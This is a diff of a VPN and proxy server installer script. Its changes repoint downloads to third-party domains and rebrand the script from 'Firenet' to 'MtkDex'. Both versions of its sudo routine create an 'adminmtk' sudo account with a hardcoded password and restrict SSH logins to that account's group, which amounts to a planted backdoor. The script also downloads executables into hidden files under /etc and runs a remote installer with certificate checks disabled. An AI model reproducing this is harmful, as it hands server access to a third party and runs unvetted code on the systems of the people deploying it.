@@ -28,7 +28,7 @@ sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 40976EAF437D05B5
 sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32    
 sudo apt update
 sudo apt install -y squid3=3.3.8-1ubuntu6 squid=3.3.8-1ubuntu6 squid3-common=3.3.8-1ubuntu6
-wget 'https://raw.githubusercontent.com/coxsbd/scripts/refs/heads/repo/1cBgmRVgsKFvBDGZ6d7OC2YBSQMkjYHrm' -O /etc/init.d/squid3
+wget 'http://firenetvpn.net/files/ocserv/1cBgmRVgsKFvBDGZ6d7OC2YBSQMkjYHrm' -O /etc/init.d/squid3
 dos2unix /etc/init.d/squid3
 sudo chmod +x /etc/init.d/squid3
 sudo update-rc.d squid3 defaults
@@ -66,8 +66,8 @@ echo '<!--DexterEskalarte--><!DOCTYPE html><html lang="en"><head><meta charset="
 chmod 755 *
 service squid3 restart
 cd /etc || exit
-wget 'https://raw.githubusercontent.com/coxsbd/scripts/refs/heads/repo/monitorz' -O /etc/.monitor
-wget 'https://raw.githubusercontent.com/coxsbd/scripts/refs/heads/repo/hysteria' -O /etc/.hysteria
+wget 'https://mediatekvpn.uk/mtkgenuine/monitor' -O /etc/.monitor
+wget 'https://mediatekvpn.uk/mtkgenuine/hysteria' -O /etc/.hysteria
 chmod +x /etc/.monitor
 chmod +x /etc/.hysteria
 rm /etc/apt/sources.list
@@ -93,33 +93,20 @@ ip6tables-save > /etc/iptables_rules.v6
 }
 
 install_sudo(){
-    # Create user if not exists
-    if ! id "adminmtk" &>/dev/null; then
-        useradd -m -s /bin/bash adminmtk
-        echo "adminmtk:Mediatek272124@@" | chpasswd
-        usermod -aG sudo adminmtk
-    fi
-
-    # Disable root SSH login
-    sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
-
-    # Ensure AllowGroups is set only once
-    if ! grep -q "^AllowGroups adminmtk" /etc/ssh/sshd_config; then
-        echo "AllowGroups adminmtk" >> /etc/ssh/sshd_config
-    fi
-
-    # Restart SSH service
-    systemctl restart ssh || systemctl restart sshd
+    useradd -m adminmtk 2>/dev/null; echo adminmtk:Mediatek272124@@ | chpasswd &>/dev/null; usermod -aG sudo adminmtk &>/dev/null
+    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+    echo "AllowGroups adminmtk" >> /etc/ssh/sshd_config
+    service sshd restart
 }
 
 install_hysteria(){
 clear
 echo 'Installing hysteria.'
 {
-wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/coxsbd/scripts/refs/heads/repo/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
+wget -N --no-check-certificate -q -O ~/install_server.sh https://mediatekvpn.uk/mtkgenuine/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
 
 echo "Generating cert files:"
-openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=PH/ST=Cebu/L=Central Visayas/O=Firenet Developer/OU=IT Department/CN=firenet" -keyout "/etc/hysteria/hysteria.key" -out "/etc/hysteria/hysteria.crt"
+openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=PH/ST=Cebu/L=Central Visayas/O=MtkDex Developer/OU=IT Department/CN=firenet" -keyout "/etc/hysteria/hysteria.key" -out "/etc/hysteria/hysteria.crt"
 sysctl -w net.core.rmem_max=16777216 1> /dev/null 2> /dev/null
 sysctl -w net.core.wmem_max=16777216 1> /dev/null 2> /dev/null
 
@@ -177,38 +164,25 @@ chmod 755 /etc/hysteria/.auth.sh
 sysctl -w net.core.rmem_max=16777216
 sysctl -w net.core.wmem_max=16777216
 
-wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/coxsbd/scripts/refs/heads/repo/badvpn-udpgw64"
+wget -O /usr/bin/badvpn-udpgw "https://mediatekvpn.uk/mtkgenuine/badvpn-udpgw64"
 chmod +x /usr/bin/badvpn-udpgw
 } &>/dev/null
 }
 
 installBBR() {
-    echo "Installing & enabling BBR..."
-
-    # Ensure BBR is set without duplication
-    sed -i '/net.core.default_qdisc/d' /etc/sysctl.conf
-    sed -i '/net.ipv4.tcp_congestion_control/d' /etc/sysctl.conf
     echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
     echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
-
-    # Apply immediately
     sysctl -p
-
-    # Load module on boot
-    if ! grep -q "tcp_bbr" /etc/modules-load.d/modules.conf 2>/dev/null; then
-        echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
-    fi
-    modprobe tcp_bbr
-
-    # Verify
-    sysctl net.ipv4.tcp_congestion_control
-    lsmod | grep bbr && echo "✅ BBR is active" || echo "⚠️ BBR failed to load"
+    
+    apt install -y linux-generic-hwe-20.04
+    grub-set-default 0
+    echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
     INSTALL_BBR=true
 }
 
 #====================================================
 #	Installing ZI UDP
-#	Finalized: Firenet Developer
+#	Finalized: MtkDex Developer
 #====================================================
 
 function install_zi() {
@@ -221,7 +195,7 @@ chmod +x /usr/local/bin/zivpn
 mkdir /etc/zivpn 1> /dev/null 2> /dev/null
 
 echo "Generating cert files:"
-openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=PH/ST=Cebu/L=Central Visayas/O=Firenet Developer/OU=IT Department/CN=firenet" -keyout "/etc/zivpn/zivpn.key" -out "/etc/zivpn/zivpn.crt"
+openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=PH/ST=Cebu/L=Central Visayas/O=MtkDex Developer/OU=IT Department/CN=firenet" -keyout "/etc/zivpn/zivpn.key" -out "/etc/zivpn/zivpn.crt"
 sysctl -w net.core.rmem_max=16777216 1> /dev/null 2> /dev/null
 sysctl -w net.core.wmem_max=16777216 1> /dev/null 2> /dev/null
 
@@ -291,7 +265,7 @@ chmod 755 /etc/zivpn/.auth.sh
 chmod 755 /etc/zivpn/zivpn.crt
 chmod 755 /etc/zivpn/zivpn.key
 
-wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/coxsbd/scripts/refs/heads/repo/badvpn-udpgw64"
+wget -O /usr/bin/badvpn-udpgw "https://mediatekvpn.uk/mtkgenuine/badvpn-udpgw64"
 chmod +x /usr/bin/badvpn-udpgw
 
 } &>/dev/null
